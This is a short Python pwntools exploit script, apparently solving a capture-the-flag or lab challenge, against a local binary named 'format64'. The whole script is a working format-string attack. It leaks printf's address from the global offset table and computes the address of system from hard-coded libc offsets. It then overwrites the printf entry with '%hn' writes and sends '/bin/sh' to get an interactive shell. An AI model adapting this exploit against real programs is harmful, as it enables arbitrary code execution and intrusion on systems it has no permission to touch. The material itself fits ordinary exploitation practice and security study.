from pwn import*

io = process('./format64')

printf_so = 0x54340
system_so = 0x46590

io.sendline('a'*32 + "\x20\x10\x60" + '\x00'*5 + "\x22\x10\x60" + '\x00'*5)
io.recv()
io.sendline("%10$s")
x = io.recv()[::-1]

printf_addr = int(x.encode('hex'),16)
system_addr = printf_addr - (printf_so - system_so)

word1 = system_addr & 0xffff
word2 = system_addr >> 16 & 0xffff

s = ''
s += '%' + str(word1) + 'c%10$hn'
if word2 > word1:
	s += '%' + str(word2 - word1) + 'c%11$hn'
else:
	s += '%' + str(0x10000 + word2 - word1) + 'c%11$hn'

s = s.ljust(32,'a')
s += p64(0x601020) + p64(0x601022)

io.sendline(s)
io.sendline('/bin/sh')
io.interactive()



	
